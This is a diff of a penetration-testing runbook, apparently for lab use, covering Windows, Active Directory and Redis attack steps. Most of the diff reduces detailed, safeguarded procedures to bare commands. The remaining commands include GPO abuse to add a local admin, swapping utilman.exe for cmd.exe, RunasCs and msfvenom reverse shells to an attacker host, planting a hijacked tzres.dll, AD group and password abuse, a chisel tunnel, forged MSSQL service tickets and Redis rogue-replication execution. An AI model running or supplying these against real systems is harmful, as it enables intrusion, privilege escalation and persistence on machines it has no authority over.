-& '<REVIEWED_SHARPGPOABUSE_PATH>' --AddLocalAdmin --UserAccount '<OWNED_USERNAME>' --GPOName '<GPO_NAME>'
-```
-
-On the one affected host, apply policy and check the actual local group:
-
-```powershell
-gpupdate.exe /force
-net localgroup administrators
-```
-
-After the authorized objective, restore only the backed-up GPO. On the
-affected host, reapply policy and verify the introduced membership is gone:
-
-```powershell
-Restore-GPO -Name '<GPO_NAME>' -Path '<NEW_PRIVATE_GPO_BACKUP_DIR>' -ErrorAction Stop
-```
-
-```powershell
-gpupdate.exe /force
-net localgroup administrators
+Backup-GPO -Name '<GPO_NAME>' -Path '<NEW_BACKUP_DIR>'
+& '<SHARPGPOABUSE>' --AddLocalAdmin --UserAccount '<USER>' --GPOName '<GPO_NAME>'
+gpupdate.exe /force; net localgroup administrators
+Restore-GPO -Name '<GPO_NAME>' -Path '<NEW_BACKUP_DIR>'
 ```
 
 | Result | Next |
 | --- | --- |
-| Membership appears on the exact host | **AD-13** for one justified access check, then restore this GPO as shown below. |
-| Right, host mapping or backup is absent/denied | **AD-09** or **PAUSE-COVERAGE**; stop before mutation. |
-| Tool reports success but host membership does not change | **PAUSE-COVERAGE**; do not infer local admin. Restore any altered GPO state. |
-| Restore, policy refresh or original membership cannot be confirmed | **PAUSE-RECOVERY** and use the tested lab reset/revert. Do not claim the host restored. |
-
-Keep the exact backup path and before/after GPO and host-group results in
-private evidence. the source step's cleanup handles only the backup created by this task
-after verified restoration.
+| Membership appears on the exact host | **AD-13**, then restore. |
+| Right, host or backup missing | **AD-09**. |
+| Success text, no membership | **PAUSE-COVERAGE**. |
+| Restore unconfirmed | **PAUSE-RECOVERY**. |
 
 ## WIN-09. Keep one recoverable accessibility-binary test
 
-Enter only on an assigned disposable Windows lab with a tested reset path,
-current-token `SeRestorePrivilege`, and an already trusted RDP sign-in path from
-**RDP-01**. Keep the original privileged PowerShell session open. If RDP trust
-is unresolved, stop at **PAUSE-ROUTE**; do not use `/cert:ignore` as a shortcut.
-This changes protected OS files and is never a routine host-enumeration step.
-
-In that same PowerShell process, review and hash the exact helper, run it, and
-require its own `GetLastError returned: 0` output before any file operation.
-`whoami /all` alone does not establish that the helper succeeded:
+Enter with `SeRestorePrivilege`, a trusted RDP path and a tested reset.
 
 ```powershell
-Get-FileHash -LiteralPath '<reviewed-SERESTORE_SCRIPT_PATH>' -Algorithm SHA256
-& '<same-SERESTORE_SCRIPT_PATH>'
-```
-
-Record the original Utilman hash. Create one new recovery copy in a private,
-user-writable location, not System32. Substitute a fresh exact backup path if
-Documents is unavailable. An existing backup, missing directory, reparse-point
-source, failed copy or mismatch stops the attempt without replacement:
-
-```powershell
-$source = 'C:\Windows\System32\utilman.exe'
-$backup = Join-Path $env:USERPROFILE 'Documents\utilman.exe.owbak'
-if (Test-Path -LiteralPath $backup) { throw 'Backup exists; no overwrite.' }
-if ((Get-Item -LiteralPath $source -ErrorAction Stop).Attributes -band [IO.FileAttributes]::ReparsePoint) { throw 'Resolve source reparse point first.' }
-$original = (Get-FileHash -LiteralPath $source -Algorithm SHA256 -ErrorAction Stop).Hash
+& '<SERESTORE_HELPER>'
+$source='C:\Windows\System32\utilman.exe'; $backup="$env:USERPROFILE\Documents\utilman.exe.owbak"
 [IO.File]::Copy($source, $backup, $false)
-if ((Get-FileHash -LiteralPath $backup -Algorithm SHA256 -ErrorAction Stop).Hash -ne $original) { throw 'Backup mismatch; no rename.' }
-Write-Output "Original SHA256: $original"
+Rename-Item -LiteralPath $source -NewName 'utilman.exe.old'
+Rename-Item -LiteralPath 'C:\Windows\System32\cmd.exe' -NewName 'utilman.exe'
 ```
 
-Confirm `cmd.exe` is the ordinary original, `utilman.exe.old` is absent, and
-the backup is still present and matching. In the original privileged session,
-rename once. If the second rename fails, the catch block tries to return the
-first file to its original name. Any failed rollback is **PAUSE-RECOVERY**, not
-permission to retry or trigger RDP:
-
-```powershell
-$dir = 'C:\Windows\System32'
-if (Test-Path -LiteralPath "$dir\utilman.exe.old") { throw 'Old-name collision; stop.' }
-if (-not (Test-Path -LiteralPath "$dir\cmd.exe")) { throw 'cmd.exe absent; stop.' }
-Rename-Item -LiteralPath "$dir\utilman.exe" -NewName 'utilman.exe.old' -ErrorAction Stop
-try {
-    Rename-Item -LiteralPath "$dir\cmd.exe" -NewName 'utilman.exe' -ErrorAction Stop
-} catch {
-    try { Rename-Item -LiteralPath "$dir\utilman.exe.old" -NewName 'utilman.exe' -ErrorAction Stop } catch { throw 'Rollback failed; stop for recovery.' }
-    throw 'Second rename failed; original restored. Stop.'
-}
-Get-Item -LiteralPath "$dir\utilman.exe", "$dir\utilman.exe.old" -ErrorAction Stop
-```
-
-Only after both renamed files are accounted for, use the trusted RDP sign-in
-screen and press Windows+U once. In the opened window, run `hostname` and
-`whoami /all`; a window or changed file alone is not SYSTEM proof. Restore
-immediately from the original PowerShell session, even if no new token appears.
-Do not assume the trial walkthrough proved restoration; it did not show it.
-
-```powershell
-$dir = 'C:\Windows\System32'
-if (Test-Path -LiteralPath "$dir\cmd.exe") { throw 'cmd.exe collision; stop for recovery.' }
-if (-not (Test-Path -LiteralPath "$dir\utilman.exe.old")) { throw 'Original missing; stop for recovery.' }
-Rename-Item -LiteralPath "$dir\utilman.exe" -NewName 'cmd.exe' -ErrorAction Stop
-try {
-    Rename-Item -LiteralPath "$dir\utilman.exe.old" -NewName 'utilman.exe' -ErrorAction Stop
-} catch {
-    throw 'Partial restore; keep backup and original shell for recovery.'
-}
-$backup = Join-Path $env:USERPROFILE 'Documents\utilman.exe.owbak'
-if ((Get-FileHash -LiteralPath "$dir\utilman.exe" -Algorithm SHA256 -ErrorAction Stop).Hash -ne (Get-FileHash -LiteralPath $backup -Algorithm SHA256 -ErrorAction Stop).Hash) { throw 'Restored bytes differ; keep backup.' }
-Get-FileHash -LiteralPath "$dir\utilman.exe", "$dir\cmd.exe" -Algorithm SHA256
-```
-
-Confirm the recorded original hash and ordinary Utility Manager behavior.
-Only after both are verified, remove the exact backup created by this task:
-
-```powershell
-Remove-Item -LiteralPath (Join-Path $env:USERPROFILE 'Documents\utilman.exe.owbak') -ErrorAction Stop
-```
+Trigger Windows+U at the RDP logon screen, run `hostname; whoami /all`, then restore both renames and compare hashes.
 
 | Result | Next |
 | --- | --- |
-| `system_token_original_restored`: assigned host/SYSTEM and original bytes/behavior independently verified | **WIN-01** for the new token, then the exact objective. |
-| `privilege_or_backup_absent`: required token, trusted RDP, helper success or fresh matching backup is absent | **WIN-02** for another observed lead; no rename. |
-| `no_confirmed_transition`: no attributable new token after the one trigger | **PAUSE-COVERAGE** after verified restoration. |
-| `cleanup_incomplete`: any rename/rollback/restore, original bytes or normal behavior uncertain | **PAUSE-RECOVERY**; keep the backup and use the disposable-lab reset plan. |
+| SYSTEM and original bytes/behaviour verified | **WIN-01**. |
+| Prerequisite missing | **WIN-02**. |
+| No new token | **PAUSE-COVERAGE** after restore. |
+| Restore uncertain | **PAUSE-RECOVERY**. |
 
 ## WIN-10 Start a process with one known plaintext credential
 
-Shell: Windows PowerShell and Kali
-
-Enter when: One validated plaintext credential has an exact local/domain process context.
-
-Question: Does one matching process-switch command yield the intended account?
-
-Use only a validated domain or local plaintext credential when remote logon is unavailable. Start the listener, then choose one matching RunasCs command.
-
-Listener first
-
 ```text
 rlwrap nc -lvnp <LPORT>
+& '<RUNASCS>' '<USERNAME>' '<PASSWORD>' cmd.exe -d '<DOMAIN>' -r '<LHOST>:<LPORT>'
 ```
 
-Choose one  Domain credential
+Drop `-d '<DOMAIN>'` for a local account. Verify with `whoami /all`.
 
-```text
-& '<RUNASCS_PATH>' '<USERNAME>' '<PASSWORD>' cmd.exe -d '<DOMAIN>' -r '<LHOST>:<LPORT>'
-```
-
-Choose one  Local credential
-
-```text
-& '<RUNASCS_PATH>' '<LOCAL_USERNAME>' '<PASSWORD>' cmd.exe -r '<LHOST>:<LPORT>'
-```
-
-Verify the callback
-
-```text
-whoami /all
-```
-
-Run exactly one domain or local alternative. A callback whose whoami /all reports the intended account confirms the process switch; then return to WIN-01. No callback leaves the attempt unresolved and does not invalidate the credential.
-
-- intended_callback_identity: Inspect the new token separately; account change does not guarantee elevation. Next: WIN-01.
-- no_callback: Retain network/logon-right ambiguity without invalidating the credential. Next: PAUSE-COVERAGE.
-- wrong_identity_or_scope: Recheck the exact justified identity scope before any new attempt. Next: AD-03.
+| Result | Next |
+| --- | --- |
+| Intended identity | **WIN-01**. |
+| No callback | **PAUSE-COVERAGE**. |
+| Wrong identity | **AD-03**. |
 
 ## WIN-11. Test one SeManageVolume path with a reset owed
 
-Enter only when **WIN-01** shows `SeManageVolumePrivilege` enabled in the
-current token on the assigned disposable host. Require a tested reset/revert
-point before any helper or DLL action. Keep the original shell open. Review the
-exact helper and its hash; do not run an unreviewed replacement.
-
-Before the broad-ACL helper runs, record whether the exact trigger DLL exists.
-If it does, make a new, matching recovery copy in a private user-writable path.
-An existing backup or failed copy stops the attempt; do not overwrite it:
+Enter with `SeManageVolumePrivilege` and a tested reset. Back up `C:\Windows\System32\wbem\tzres.dll` if present, run the reviewed helper, stage a matching DLL, then trigger with `systeminfo`:
 
 ```powershell
-$target = 'C:\Windows\System32\wbem\tzres.dll'
-$backup = '<NEW_PRIVATE_ABSOLUTE_BACKUP_PATH>'
-if (Test-Path -LiteralPath $backup) { throw 'Backup exists; stop.' }
-if (Test-Path -LiteralPath $target) {
-  $original = (Get-FileHash -LiteralPath $target -Algorithm SHA256 -ErrorAction Stop).Hash
-  [IO.File]::Copy($target, $backup, $false)
-  if ((Get-FileHash -LiteralPath $backup -Algorithm SHA256 -ErrorAction Stop).Hash -ne $original) { throw 'Backup mismatch; stop.' }
-  Write-Output "Original SHA256: $original"
-} else {
-  Write-Output 'Trigger DLL absent before attempt'
-}
-```
-
-Run the one reviewed privilege helper and confirm its reported result plus the
-actual ACL effect before staging a DLL. A failed helper or unreadable effect
-stops the trigger path; the broad change may still require reset:
-
-```powershell
-Get-FileHash -LiteralPath '<REVIEWED_SEMANAGEVOLUME_HELPER>' -Algorithm SHA256
-& '<SAME_REVIEWED_SEMANAGEVOLUME_HELPER>'
-icacls 'C:\Windows'
-```
-
-Generate one architecture-matched DLL at a fresh private Kali path, hash it,
-serve only its containing directory on the owned lab interface, and transfer
-to a new private Windows staging path. Stop on a pre-existing stage, transfer
-failure or hash mismatch:
-
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<OWNED_KALI_LAB_IP> LPORT=<CALLBACK_PORT> -f dll -o '<NEW_PRIVATE_DLL_PATH>'
-sha256sum -- '<SAME_PRIVATE_DLL_PATH>'
-python3 -m http.server '<UNUSED_HTTP_PORT>' --bind '<OWNED_KALI_LAB_IP>' --directory '<PRIVATE_DIRECTORY_CONTAINING_ONLY_THE_DLL>'
-```
-
-```powershell
-if (Test-Path -LiteralPath '<NEW_PRIVATE_WINDOWS_STAGE>') { throw 'Staging file exists; stop.' }
-Invoke-WebRequest 'http://<OWNED_KALI_LAB_IP>:<HTTP_PORT>/<EXACT_DLL_NAME>' -OutFile '<SAME_PRIVATE_WINDOWS_STAGE>' -ErrorAction Stop
-if ((Get-FileHash -LiteralPath '<SAME_PRIVATE_WINDOWS_STAGE>' -Algorithm SHA256 -ErrorAction Stop).Hash -ne '<RECORDED_KALI_DLL_SHA256>') { throw 'Stage hash mismatch; stop.' }
-```
-
-Start the reviewed foreground callback listener first. In the original
-Windows shell, confirm the trigger path still matches its recorded
-present/absent state; replace only that exact backed-up or absent path, then
-invoke the one reviewed trigger:
-
-```bash
-nc -lvnp <CALLBACK_PORT>
-```
-
-```powershell
-Copy-Item -LiteralPath '<SAME_PRIVATE_WINDOWS_STAGE>' -Destination 'C:\Windows\System32\wbem\tzres.dll' -Force -ErrorAction Stop
+& '<SEMANAGEVOLUME_HELPER>'
+Copy-Item -LiteralPath '<STAGE>' -Destination 'C:\Windows\System32\wbem\tzres.dll' -Force
 systeminfo
 ```
 
-In an actual callback process, run `hostname` and `whoami /all`. A helper
-message, DLL placement, trigger exit or connection alone is not identity
-proof. From the original shell, restore the original DLL if one was backed up;
-otherwise remove only the newly introduced DLL. Compare restored bytes with
-the recorded original. Keep the backup until ordinary behavior and reset are
-verified. Stop the exact server/listener and remove only files created for
-this attempt. A reset or revert remains required because the helper's broad
-permission change is not reversed by DLL cleanup.
-
-If the original DLL **existed**, use this recovery block in the original
-PowerShell shell. Stop at any mismatch and retain the backup:
-
-```powershell
-if (-not (Test-Path -LiteralPath '<SAME_PRIVATE_BACKUP_PATH>')) { throw 'Backup missing; stop for recovery.' }
-Copy-Item -LiteralPath '<SAME_PRIVATE_BACKUP_PATH>' -Destination 'C:\Windows\System32\wbem\tzres.dll' -Force -ErrorAction Stop
-if ((Get-FileHash -LiteralPath 'C:\Windows\System32\wbem\tzres.dll' -Algorithm SHA256 -ErrorAction Stop).Hash -ne '<RECORDED_ORIGINAL_DLL_SHA256>') { throw 'Restored DLL mismatch; keep backup.' }
-```
-
-If it was **absent** before the attempt, use this instead. Only the exact
-introduced DLL with the recorded staged hash may be removed:
-
-```powershell
-if ((Get-FileHash -LiteralPath 'C:\Windows\System32\wbem\tzres.dll' -Algorithm SHA256 -ErrorAction Stop).Hash -ne '<RECORDED_KALI_DLL_SHA256>') { throw 'Trigger DLL changed; stop for recovery.' }
-Remove-Item -LiteralPath 'C:\Windows\System32\wbem\tzres.dll' -ErrorAction Stop
-```
-
-After the required reset/revert and evidence decision, remove only the exact
-private stage and backup created for this attempt. Do not remove the original
-reviewed helper or another operator's files:
-
-```powershell
-Remove-Item -LiteralPath '<SAME_PRIVATE_WINDOWS_STAGE>' -ErrorAction Stop
-```
-
-If the original DLL existed and its matching recovery copy was created,
-remove that exact backup only after reset and normal behavior are confirmed:
-
-```powershell
-Remove-Item -LiteralPath '<SAME_PRIVATE_BACKUP_PATH>' -ErrorAction Stop
-```
+Restore the backup, or remove the DLL if it was absent, and reset the broad ACL afterwards.
 
 | Result | Next |
 | --- | --- |
-| Attributed callback and exact DLL restoration/removal | **WIN-01** for the actual token; retain reset/revert at the source step's cleanup. Do not equate it with SYSTEM. |
-| Privilege, backup, helper or stage gate fails before trigger | Stop. If the ACL changed, use the preselected lab reset; return to **WIN-02** only afterward. |
-| No attributable callback after one trigger | Restore the DLL, then **PAUSE-COVERAGE** with the exact missing result; reset before a new attempt. |
-| DLL custody, original bytes/behavior or broad reset uncertain | **PAUSE-RECOVERY**. Keep the backup and original shell; do not retry. |
+| Callback and DLL restored/removed | **WIN-01**; reset stays owed. |
+| Gate fails before trigger | **WIN-02** after any reset. |
+| No callback | Restore, then **PAUSE-COVERAGE**. |
+| Custody or reset uncertain | **PAUSE-RECOVERY**. |
 
 ## AD-19. Exercise one exact AD object-control right
 
-Enter only with a verified owned-principal edge to one exact user or group on
-an assigned disposable lab. Choose group membership or password reset, never
-both as a routine sequence.
+Group path:
 
-For an authorized group-member path, record the original member list:
-
-```bash
+```text
 bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get object '<TARGET_GROUP>' --attr member
-```
-
-If the owned identity is absent and the exact WriteMembers/GenericAll right
-applies, add only that identity, then read the group again:
-
-```bash
 bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' add groupMember '<TARGET_GROUP>' '<USERNAME>'
-```
-
-```bash
-bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get object '<TARGET_GROUP>' --attr member
-```
-
-After the one authorized access check, remove only the member introduced by
-this task and read the group a third time. Compare it with the original list:
-
-```bash
 bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' remove groupMember '<TARGET_GROUP>' '<USERNAME>'
 ```
 
-```bash
-bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' get object '<TARGET_GROUP>' --attr member
-```
-
-Alternative user path: only if the verified right permits password reset and
-the lab reset/revert is available, change one controlled user. The prior
-password is unknown, so this is not locally reversible:
-
-```bash
-bloodyAD -H <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' set password '<TARGET_USER>' '<NEW_CONTROLLED_PASSWORD>'
-```
-
-Validate that one account on one justified host through **AD-03**. A password
-reset remains an owed lab reset/revert even after authentication succeeds.
+Password path instead: `bloodyAD ... set password '<TARGET_USER>' '<NEW_PASSWORD>'` and validate once through AD-03.
 
 | Result | Next |
 | --- | --- |
-| New membership verified on the exact group | **AD-12** or **AD-13** only for a matching observed host/service; exact member removal remains owed. |
-| Reset account authenticates on the justified service | Record authentication, not a shell. **AD-12** or **AD-13** only when its separate prerequisite is met; reset/revert remains owed. |
-| Edge, group/user or current principal does not match | **AD-09**; do not substitute a broader object. |
-| Member removal, original list comparison or password-reset recovery is incomplete | **PAUSE-RECOVERY**; use the tested disposable-lab reset/revert. |
-
-Preserve the original member list and any credential change privately. Do not
-call a changed group or user restored from tool success text alone.
+| Membership verified | **AD-12** or **AD-13**. |
+| Reset account authenticates | **AD-12** / **AD-13**; reset stays owed. |
+| Edge mismatch | **AD-09**. |
+| Cleanup incomplete | **PAUSE-RECOVERY**. |
 
 ## WIN-12. Verify and contain one Windows loopback service
 
-Enter only when the Windows shell proves one useful listener on `127.0.0.1` and
-the assigned scope permits a Kali loopback tunnel. Set `REMOTE_PORT` to that
-observed port and choose an unused `LOCAL_PORT`; do not forward a range or bind
-the forwarded listener to another interface.
-
-On the Windows shell, capture the exact listener and owning process:
-
 ```powershell
-Get-NetTCPConnection -State Listen |
-  Where-Object { $_.LocalAddress -eq '127.0.0.1' -and $_.LocalPort -eq [int]'<observed-windows-loopback-port>' } |
-  Select-Object LocalAddress, LocalPort, OwningProcess
+Get-NetTCPConnection -State Listen | Where-Object { $_.LocalAddress -eq '127.0.0.1' } | Select-Object LocalPort, OwningProcess
+& '<CHISEL>' 'client' 'http://<LHOST>:<PORT>' 'R:127.0.0.1:<LOCAL_PORT>:127.0.0.1:<REMOTE_PORT>'
 ```
 
-On Kali, start the reviewed reverse server in one visible terminal:
-
-```bash
-chisel server --reverse --port '<unused-chisel-listener-port>'
-```
-
-In the existing Windows shell, run the reviewed client for exactly one port:
-
-```powershell
-& '<reviewed-local-chisel-path>' 'client' 'http://<assigned-kali-reachable-address>:<same-chisel-listener-port>' 'R:127.0.0.1:<unused-kali-loopback-port>:127.0.0.1:<exact-windows-loopback-port>'
-```
-
-In a second Kali terminal, verify transport only and identify the service with
-the matching protocol procedure before authenticating:
-
-```bash
-nmap -sT -Pn -p '<same-kali-loopback-port>' 127.0.0.1
-```
-
-Keep both tunnel processes visible. After the one service check, stop the
-Windows client and Kali server with their normal foreground interrupt, then
-re-run the local port check and confirm the forwarded listener is closed.
+On Kali: `chisel server --reverse --port '<PORT>'`, then `nmap -sT -Pn -p '<LOCAL_PORT>' 127.0.0.1`. Stop both processes after the check.
 
 | Result | Next |
 | --- | --- |
-| Exact loopback listener, tunnel and one local forwarded port are confirmed | Record Windows address/port, process ID, Kali local port and protocol banner; continue to **AD-20** only when exact MSSQL identity/SPN/secret prerequisites are already present, otherwise choose the matching service procedure. |
-| Listener is on another address, process ownership is unclear or the port changed | **PAUSE-COVERAGE**; do not broaden the bind or forward a new port automatically. |
-| Local port opens but protocol identity/authentication is not established | Record transport only and route to **GAP-SERVICE** or the named protocol checklist; an open port is not a login. |
-| Client/server exits, the tunnel is denied or the forwarded port is absent | Preserve both command outputs and route to **PAUSE-COVERAGE**; do not retry with a range or alternate bind. |
-| After the check the listener remains open | **PAUSE-RECOVERY**; stop only the exact client/server process you started and verify the port closes. |
-
-Do not bind to `0.0.0.0`, forward another interface, forward a range, start a
-second tunnel, or leave the client/server running after the service check.
+| Forwarded port answers | Matching service task; **AD-20** for MSSQL. |
+| Listener unclear | **PAUSE-COVERAGE**. |
+| Port open, protocol unknown | **GAP-SERVICE**. |
+| Port does not close | **PAUSE-RECOVERY**. |
 
 ## AD-20. Use one exact MSSQL service ticket to test SQL access
 
-Enter only with the exact MSSQLSvc SPN, matching service secret, domain SID,
-selected existing user and confirmed **WIN-12** loopback tunnel. This is a
-ticket-backed SQL login question. It does not enable SQL configuration or open
-a Windows callback.
+Enter with the MSSQLSvc SPN, service secret, domain SID, user and a live tunnel.
 
-If the domain SID is not already recorded for this identity, read it once:
-
-```bash
-nxc ldap <DC_IP> -d <DOMAIN> -u <USERNAME> -p '<PASSWORD>' --get-sid
-```
-
-In a fresh private empty Kali directory, choose the one known service-secret
-form. Confirm the generated `<TARGET_USER>.ccache` is new; never overwrite an
-earlier ticket:
-
-```bash
-impacket-ticketer -password '<SERVICE_PASSWORD>' -domain-sid '<DOMAIN_SID>' -domain '<DOMAIN>' -spn 'MSSQLSvc/<TARGET_HOST>:<REMOTE_PORT>' '<TARGET_USER>'
-```
-
-```bash
-impacket-ticketer -nthash '<SERVICE_NTLM_HASH>' -domain-sid '<DOMAIN_SID>' -domain '<DOMAIN>' -spn 'MSSQLSvc/<TARGET_HOST>:<REMOTE_PORT>' '<TARGET_USER>'
-```
-
-Check that exact ticket, then use it for one connection through the existing
-loopback tunnel:
-
-```bash
-klist -c '<NEW_PRIVATE_CCACHE_PATH>'
-```
-
-```bash
-KRB5CCNAME='<NEW_PRIVATE_CCACHE_PATH>' impacket-mssqlclient -windows-auth -k -no-pass '<DOMAIN>/<TARGET_USER>@<TARGET_HOST>' -target-ip 127.0.0.1 -port <LOCAL_PORT>
+```text
+impacket-ticketer -password '<SERVICE_PASSWORD>' -domain-sid '<SID>' -domain '<DOMAIN>' -spn 'MSSQLSvc/<TARGET_HOST>:<PORT>' '<TARGET_USER>'
+KRB5CCNAME='<CCACHE>' impacket-mssqlclient -windows-auth -k -no-pass '<DOMAIN>/<TARGET_USER>@<TARGET_HOST>' -target-ip 127.0.0.1 -port <LOCAL_PORT>
 ```
 
 | Result | Next |
 | --- | --- |
-| Exact SQL prompt opens on the intended service | **DB-04** for SQL identity and permissions. This is SQL access, not a Windows shell. **DB-05** is conditional on its own observed rights and recovery gate. |
-| Ticket/SPN, controller, time or tunnel does not match | **PAUSE-ROUTE** with the exact failed stage; do not mint another ticket with guessed naming. |
-| Ticket exists but SQL rejects access | Keep ticket creation distinct from service authentication; **PAUSE-COVERAGE**. |
-| Tunnel or private ticket cleanup cannot be confirmed | **PAUSE-RECOVERY**; retain exact local artifact and process state. |
-
-Close the SQL client and the exact **WIN-12** tunnel when done. Remove the
-private ticket through the source step's cleanup after its evidence purpose ends.
+| SQL prompt | **DB-04**. |
+| SPN, time or tunnel mismatch | **PAUSE-ROUTE**. |
+| SQL rejects the ticket | **PAUSE-COVERAGE**. |
 
 # redis
 
 ## REDIS-01. Does this Redis endpoint permit the intended connection?
 
-Run on Kali against the one observed host and port:
-
 ```bash
-redis-cli -h '<TARGET_IP>' -p <OBSERVED_PORT> PING
+redis-cli -h '<TARGET_IP>' -p <PORT> PING
 ```
 
-| Result | Next choice |
+With a supplied password, use `--askpass`; add `--user '<USER>'` for an ACL user.
+
+| Result | Next |
 | --- | --- |
-| `PONG` | **REDIS-02** for read-only runtime context. Redis response is not a shell. |
-| `NOAUTH` and you have a supplied, permitted password | Use the prompted command below instead. `PONG` goes to **REDIS-02**. |
-| `NOAUTH` without a permitted credential, or failed authentication | **NET-05**, choose another observed lead. Do not guess credentials. |
-| `NOPERM` or protected-mode denial | Keep this operation's denial; **NET-05**. Do not disable protection. |
-| Connection error, wrong protocol or missing client | Keep the unresolved endpoint/client question; **NET-05** or **PAUSE-COVERAGE**. No Redis identity inferred from the port number. |
-
-With a supplied password, replace the default command with:
-
-```bash
-redis-cli -h '<TARGET_IP>' -p <OBSERVED_PORT> --askpass PING
-```
-
-If the supplied account includes an ACL username, use this instead:
-
-```bash
-redis-cli -h '<TARGET_IP>' -p <OBSERVED_PORT> --user '<SUPPLIED_USER>' --askpass PING
-```
-
-Enter the password at the prompt, not in the command line.
+| `PONG` | **REDIS-02**. |
+| `NOAUTH` with a permitted password | Retry with `--askpass`. |
+| `NOAUTH` without a credential, or auth fails | **NET-05**. |
+| `NOPERM` or protected-mode denial | **NET-05**. |
+| Connection error | **NET-05** or **PAUSE-COVERAGE**. |
 
 ## REDIS-02. What runtime context can this access read?
 
-Open the client on Kali, using the same endpoint and permitted identity:
-
 ```bash
-redis-cli -h '<TARGET_IP>' -p <OBSERVED_PORT>
+redis-cli -h '<TARGET_IP>' -p <PORT>
 ```
 
-If authentication is needed, use this instead:
-
-```bash
-redis-cli -h '<TARGET_IP>' -p <OBSERVED_PORT> --askpass
-```
-
-For a supplied ACL username, use this instead:
-
-```bash
-redis-cli -h '<TARGET_IP>' -p <OBSERVED_PORT> --user '<SUPPLIED_USER>' --askpass
-```
-
-At the Redis prompt:
+At the prompt:
 
 ```text
 INFO server
-```
-
-Keep the returned version and runtime identity. If a known configuration-path
-question changes your next action, read only the relevant setting:
-
-```text
 CONFIG GET dir
-```
-
-or, for the configured snapshot filename:
-
-```text
 CONFIG GET dbfilename
-```
-
-| Result | Next choice |
-| --- | --- |
-| Runtime information returned and a matching Redis execution candidate exists | **REDIS-03** to verify its exact prerequisites. Version text alone is not a vulnerability finding. |
-| Setting returned and a matching Redis execution candidate exists | Keep it as configuration, not proof the directory is writable or that any file was created; **REDIS-03**. |
-| Runtime information returned with no matching candidate | Keep it as service context; **NET-05** for another observed question. |
-| `NOPERM`, unsupported command or incomplete response | Keep that exact visibility limit; **NET-05** or **PAUSE-COVERAGE** if it blocks the current question. Do not change ACLs/configuration. |
-| An independently verified Linux session already exists | **LNX-01** for that session's identity, reusing its existing proof. Redis access does not supply this prerequisite. |
-
-Exit the client when finished:
-
-```text
 QUIT
 ```
 
+| Result | Next |
+| --- | --- |
+| Version and a matching execution candidate | **REDIS-03**. |
+| Context only, no candidate | **NET-05**. |
+| `NOPERM` or partial | **PAUSE-COVERAGE**. |
+
 ## REDIS-03. Does the reviewed Redis candidate match this live instance?
 
-Enter only after **EXP-01** identifies a candidate whose documented
-prerequisites include Redis module or replication commands. At the same
-authenticated Redis prompt, inspect only those capabilities:
+Enter after EXP-01 named a module- or replication-based candidate.
 
 ```text
 COMMAND INFO MODULE
-```
-
-```text
 COMMAND INFO REPLICAOF
-```
-
-If the reviewed candidate names the legacy command instead:
-
-```text
-COMMAND INFO SLAVEOF
-```
-
-Check current module and replication state before one reviewed attempt:
-
-```text
 MODULE LIST
-```
-
-```text
 INFO replication
 ```
 
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Candidate version and every required command are present, and this is a disposable lab with a reset route | **REXP-01** for the conditional rogue-replication path. Other reviewed candidates still use **EXP-02**. |
-| Required command is absent, renamed, disabled or denied | **NET-05** for another observed lead. Do not substitute an unrelated Redis command. |
-| Module or replication state already differs from the expected baseline | Preserve the observed state; **PAUSE-RECOVERY** before changing it. |
-| Version or prerequisite remains uncertain | **EXP-01**. Resolve that exact gap before an attempt. |
-
-These commands do not load a module, change replication or write a file.
+| Commands present, disposable lab with reset | **REXP-01**, or **EXP-02** for other candidates. |
+| Required command absent or denied | **NET-05**. |
+| State already differs from baseline | **PAUSE-RECOVERY**. |
 
 ## REDIS-04. Did the reviewed Redis attempt produce attributable OS execution?
 
-Use this only when the reviewed attempt reported that it added the exact
-`system.exec` command. Reconnect with the same permitted identity and confirm
-that command exists:
+Only after the attempt reports `system.exec` was added.
 
 ```text
 COMMAND INFO system.exec
-```
-
-If Redis returns command metadata, request the smallest identity proof:
-
-```text
 system.exec "id"
-```
-
-Then correlate the host:
-
-```text
 system.exec "hostname"
 ```
 
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Both commands return attributable OS output from the assigned host | Record command execution as the reported account. If the reviewed route provides a socket shell, use **SHELL-01**, then **EXP-03** and **LNX-01**. |
-| A usable shell already exists and its host/identity match | **EXP-03**, then **LNX-01**. Redis command execution and an interactive shell remain separate facts. |
-| Command absent, output missing or host attribution conflicts | **EXP-02** with the exact result. Do not claim execution or repeat the attempt unchanged. |
-| Attempt changed module or replication state but proof is uncertain | **PAUSE-RECOVERY**. Restore the reviewed attempt's exact state before another route. |
-
-Once **LNX-01** verifies the shell, use **LNX-04** for an actual write failure,
-**LNX-06** for an observed scheduled consumer and **LNX-09** for one supported
-privilege hypothesis. A root GNU tar job that expands `*` in a directory the
-current user can write routes to **LPRIV-15**.
+| Attributable output from the assigned host | **SHELL-01** if a socket shell exists, then **EXP-03** / **LNX-01**. |
+| Command missing or host conflict | **EXP-02**. |
+| State changed, proof uncertain | **PAUSE-RECOVERY**. |
 
 # redis_exploitation
 
 ## REXP-01. Does the live Redis instance satisfy the rogue-replication prerequisites?
 
-Enter from **REDIS-03** only when the reviewed local tool revision and `exp.so`
-hash are recorded. At the authenticated Redis prompt, capture the current role,
-module list and persistence path:
+Enter from REDIS-03 with the reviewed tool and `exp.so` hash recorded.
 
 ```text
 INFO replication
-```
-
-```text
 MODULE LIST
-```
-
-```text
 CONFIG GET dir
-```
-
-```text
 CONFIG GET dbfilename
 ```
 
-Proceed only when all are true:
+Proceed only when the version matches, the role is `master`, module/replication/CONFIG are permitted, no `system` module exists, and the target can reach Kali.
 
-- this is an authorized disposable lab with a working reset or revert route;
-- the live version matches the reviewed Redis 4.x/5.x candidate;
-- the role is `master`, not an existing replica;
-- `MODULE`, `REPLICAOF` or the reviewed legacy equivalent, and `CONFIG` are permitted;
-- no pre-existing `system` module or unexplained module state exists;
-- the target can connect back to Kali on the selected rogue-server port.
-
-| Result | Next choice |
+| Result | Next |
 | --- | --- |
-| Every prerequisite is observed and the original role, directory, filename and modules are recorded | **REXP-02** for one attempt. |
